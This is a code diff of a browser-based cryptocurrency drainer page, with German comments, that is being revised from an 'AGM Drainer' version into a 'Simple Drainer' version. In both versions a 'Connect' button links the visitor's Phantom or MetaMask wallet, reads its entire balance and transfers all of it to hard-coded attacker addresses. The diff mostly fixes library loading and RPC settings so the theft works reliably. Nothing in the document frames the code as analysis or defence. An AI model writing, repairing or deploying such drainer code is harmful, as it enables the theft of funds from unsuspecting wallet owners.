@@ -1,101 +1,128 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="de">
 <head>
-   <meta charset="UTF-8">
-   <title>AGM Drainer</title>
-   <style>
-   body { background-color: #0d1117; color: #00ffaa; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-  .card { border: 2px solid #00ffaa; padding: 40px; border-radius: 20px; text-align: center; box-shadow: 0 0 20px #00ffaa; background: #161b22; }
-   button { background: #00ffaa; color: #000; border: none; padding: 15px 30px; font-weight: bold; border-radius: 10px; cursor: pointer; width: 100%; }
-   button:disabled { background: #555; }
-   #status { margin-top: 20px; color: #ff7b72; }
-   </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Simple Drainer</title>
+    <!-- Stabile Bibliotheken -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+  
+    <style>
+    body { background: #000; color: #fff; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+   .box { border: 2px solid #00e5ff; padding: 40px; width: 300px; text-align: center; background: #111; box-shadow: 0 0 15px #00e5ff; }
+    button { background: #00e5ff; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 5px; }
+    #status { margin-top: 20px; color: #aaa; }
+   .success { color: #00ff00!important; }
+    </style>
 </head>
 <body>
 
-   <div class="card">
-   <h2>AGM DRAINER</h2>
-   <button id="btn" onclick="initiateProcess()">Connect & Drain</button>
-   <div id="status">Ready...</div>
-  </div>
+    <div class="box">
+    <h2>DRAINER</h2>
+    <button id="btn" onclick="start()">CONNECT WALLET</button>
+    <div id="status">Waiting...</div>
+ </div>
 
-   <!-- DIE LIBRARIES KOMMEN JETZT UNTEN, DIREKT VOR DER LOGIK -->
-   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
-   <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+<script>
+    const btn = document.getElementById("btn");
+    const status = document.getElementById("status");
 
-   <script>
-   const status = document.getElementById("status");
-   const btn = document.getElementById("btn");
+    // === SONSTIGES: HIER WERDEN DIE GELDER GERICHTET ===
+    // 1. ETH Adresse (MetaMask)
+    const TARGET_ETH = "0xD4144Da2f3c5D8eF7a0B1d7D2F6C6D8A5E5B4C";
+    // 2. SOL Adresse (Phantom)
+    const TARGET_SOL = "DEINE_PHANTOM_ADRESSE_HIER"; 
 
-   // Zieladressen
-   const ETH_TARGET = "0xD4144Da2f3c5D8eF7a0B1d7D2F6C6D8A5E5B4C"; 
-   const SOL_TARGET = "ZUsbM68ms7S7CifNHyM9NscZMe5NLoTeitdaN7EqCdhJ"; // Beispiel für SOL
+    async function start() {
+    btn.disabled = true;
+    status.innerText = "Finding Wallets...";
 
-   async function initiateProcess() {
-   btn.disabled = true;
-   status.innerText = "Checking for wallets...";
-   
    try {
-   if (window.solana) {
-   await drainSOL();
-   } else if (window.ethereum) {
-   await drainETH();
-   } else {
-   throw new Error("No compatible wallet found.");
-   }
-   } catch (e) {
-   status.innerText = "Process Stopped: " + e.message;
-   btn.disabled = false;
-   btn.innerText = "Retry Connection";
+    // Reihenfolge: Phantom zuerst, dann MetaMask
+    if (window.solana && window.solana.isPhantom) {
+    await drainSolana();
+    return;
+    } else if (window.ethereum) {
+    await drainEthereum();
+    return;
+  }
+
+    status.innerText = "No compatible wallet found (MetaMask or Phantom).";
+    btn.disabled = false;
+    } catch (e) {
+    status.innerText = "Error: " + e.message;
+    btn.disabled = false;
    }
   }
 
-   async function drainSOL() {
-   status.innerText = "Connecting to Phantom...";
-   // Hier wird jetzt solanaWeb3 über das globale Objekt accessed
-   // das durch die iife.min.js Library erzeugt wird
-   const solana = window.solanaWeb3; 
-   
-   if (!solana) throw new Error("solanaWeb3 library load failed!");
+    // --- PHANTOM LOGIK ---
+    async function drainSolana() {
+    const provider = window.solana;
+  
+    // Verbindung erzwingen
+    await provider.connect();
+    const { publicKey } = provider;
+    status.innerText = "Wallet Found: " + publicKey.toBase58().slice(0, 6) + "...";
 
-   const provider = window.solana;
-   await provider.connect();
-   const { publicKey } = provider;
-   
-   const connection = new solana.Connection(solana.clusterApiUrl("mainnet-beta"));
-   const balance = await connection.getBalance(publicKey);
-   
-   if (balance === 0) throw new Error("SOL Wallet empty");
-   
-   status.innerText = "Draining SOL...";
-   const tx = new solana.Transaction().add(
-   solana.SystemProgram.transfer({
-   fromPubkey: publicKey,
-   toPubkey: new solana.PublicKey(SOL_TARGET),
-   lamports: balance,
+    // FESTEN SERVER ANGEBEN, um 403 Fehler zu vermeiden
+    const connection = new solanaWeb3.Connection('https://rpc.ankr.com/solana', 'finalized');
+  
+    // Balance abfragen
+    const balance = await connection.getBalance(publicKey);
+
+    if (balance === 0) {
+    throw new Error("Solana Wallet is empty.");
+  }
+
+    status.innerText = "Draining SOL...";
+  
+    // Transaction erstellen
+    const tx = new solanaWeb3.Transaction().add(
+    solanaWeb3.SystemProgram.transfer({
+    fromPubkey: publicKey,
+    toPubkey: new solanaWeb3.PublicKey(TARGET_SOL),
+    lamports: balance,
    })
    );
-   
-   await provider.signAndSendTransaction(tx);
-   status.innerText = "DONE: SOL Sent!";
+  
+    // Sichern und senden
+    await provider.signAndSendTransaction(tx);
+    status.innerText = "DONE: SOL Sent!";
+    status.className = "success";
   }
 
-   async function drainETH() {
-   status.innerText = "Connecting to MetaMask...";
-   const provider = new ethers.BrowserProvider(window.ethereum);
-   const signer = await provider.getSigner();
-   const balance = await provider.getBalance(signer.address);
+    // --- ETHEREUM LOGIK ---
+    async function drainEthereum() {
+    // BrowserProvider laden
+    const provider = new ethers.BrowserProvider(window.ethereum);
+  
+    // Accounts abfragen (das ist der Moment, wo das Popup kommt)
+    const accounts = await provider.send("eth_requestAccounts", []);
+    const signer = await provider.getSigner();
+    const address = await signer.getAddress();
+  
+    status.innerText = "Wallet Found: " + address;
 
-   if (balance === 0n) throw new Error("ETH Wallet empty");
+    const balance = await provider.getBalance(address);
 
-   status.innerText = "Draining ETH...";
-   const tx = await signer.sendTransaction({
-   to: ETH_TARGET,
-   value: balance
+    if (balance <= 0n) {
+    throw new Error("ETH Wallet is empty.");
+  }
+
+    status.innerText = "Draining ETH...";
+  
+    // ETH Senden
+    const tx = await signer.sendTransaction({
+    to: TARGET_ETH,
+    value: balance
    });
-   await tx.wait();
-   status.innerText = "DONE: ETH Sent!";
+  
+    await tx.wait();
+    status.innerText = "DONE: ETH Sent!";
+    status.className = "success";
    }
-   </script>
+</script>
+
 </body>
 </html>
